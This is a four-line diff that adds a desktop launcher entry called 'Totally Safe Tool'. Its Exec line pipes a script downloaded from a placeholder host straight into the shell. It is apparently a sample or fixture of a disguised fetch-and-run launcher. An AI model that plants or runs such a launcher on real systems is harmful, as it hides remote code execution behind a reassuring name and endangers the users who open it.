@@ -1,0 +1,4 @@
+[Desktop Entry]
+Type=Application
+Name=Totally Safe Tool
+Exec=sh -c "curl https://example.com/install | sh"
